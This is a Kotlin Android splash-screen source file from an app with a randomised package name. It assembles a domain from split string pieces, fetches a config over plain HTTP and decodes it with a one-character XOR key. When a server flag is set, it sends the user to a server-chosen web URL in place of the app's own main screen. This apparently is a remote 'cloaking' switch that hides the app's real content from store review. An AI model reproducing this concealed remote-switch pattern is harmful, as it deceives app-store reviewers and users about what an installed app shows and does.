package com.rwAUiM.mjaymza0mdm2njqz

import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.rwAUiM.mjaymza0mdm2njqz.ui.GameActivity
import com.rwAUiM.mjaymza0mdm2njqz.ui.MainActivity
import com.rwAUiM.mjaymza0mdm2njqz.ui.WebActivity
import com.rwAUiM.mjaymza0mdm2njqz.utils.OkHttpUtils
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Response
import java.io.IOException


class SplashActivity : AppCompatActivity() {

    private var protocol = "http://"
    private var subdomain = "www."
    private var companyName = "yayyy"
    private var organizationType = "ironman"
    private var domainType = ".com"
    private var domainName = companyName + organizationType // 域名名称

    private var domain = subdomain + domainName + domainType // 完整域名


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.navigationBarColor = Color.TRANSPARENT
        OkHttpUtils.getInstance().get(
            "${protocol}${domain}/appconfig/api.php?action=get_config&package_name=${BuildConfig.APPLICATION_ID}",
            object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    toMain()
                }

                override fun onResponse(call: Call, response: Response) {
                    var str = response.body?.string() ?: ""
                    str = decrypt(str, "x")
                    Log.e( "decrypt: ", str)
                    if (str.contains("\"success\":true")) {
                        val gson = Gson()
                        val appConfig = gson.fromJson(str, AppConfig::class.java)
                        if (appConfig.configData.isWeb == 1) {
                            toWeb(appConfig.configData.webUrl)
                        } else {
                            toMain()
                        }
                    } else {
                        toMain()
                    }
                }
            })
    }

    fun toMain() {
        val intent = Intent()
        intent.setClass(this@SplashActivity, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    fun toWeb(url: String) {
        val intent = Intent(this, GameActivity::class.java)
        intent.putExtra("url", url)
        startActivity(intent)
        finish()
//        val intent = Intent()
//        intent.putExtra("KEY_URL", url)
//        intent.setClass(this@SplashActivity, WebActivity::class.java)
//        startActivity(intent)
//        finish()
    }

    fun decrypt(data: String, key: String): String {
        // 将密钥转换成字符数组
        val keyChars = key.toCharArray()
        // 将16进制表示的数据转换为字符数组
        val dataChars = data.toCharArray()
        val dataBytes = ByteArray(dataChars.size / 2)
        for (i in dataBytes.indices) {
            val high = dataChars[i * 2].digitToIntOrNull(16) ?: -1
            val low = dataChars[i * 2 + 1].digitToIntOrNull(16) ?: -1
            dataBytes[i] = (high shl 4 or low).toByte()
        }
        // 遍历密文数据，依次与密钥进行异或运算
        val sb = StringBuilder()
        for (i in dataBytes.indices) {
            sb.append((dataBytes[i].toInt() xor keyChars[i % keyChars.size].code).toChar())
        }
        return sb.toString()
    }
}